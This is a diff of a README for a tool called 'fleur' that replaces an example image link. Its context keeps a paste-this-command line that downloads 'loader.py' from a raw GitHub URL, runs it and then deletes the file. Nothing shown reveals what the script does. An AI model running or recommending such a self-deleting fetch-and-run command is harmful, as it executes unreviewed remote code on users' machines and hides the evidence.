@@ -8,5 +8,5 @@ This is a simple way to run fleur from command prompt, alternatively, you can ru
 curl -o fleur.py https://raw.githubusercontent.com/repossess/fleur/main/loader.py && start cmd.exe /k python fleur.py && timeout /t 1 >nul 2>&1 && del fleur.py && exit
 ```
 
-# example
-![explorer](https://github.com/repossess/pybear/blob/main/images/explorer.png?raw=true)
+# showcase
+![explorer](https://github.com/repossess/fleur/blob/main/images/cmd.png?raw=true)
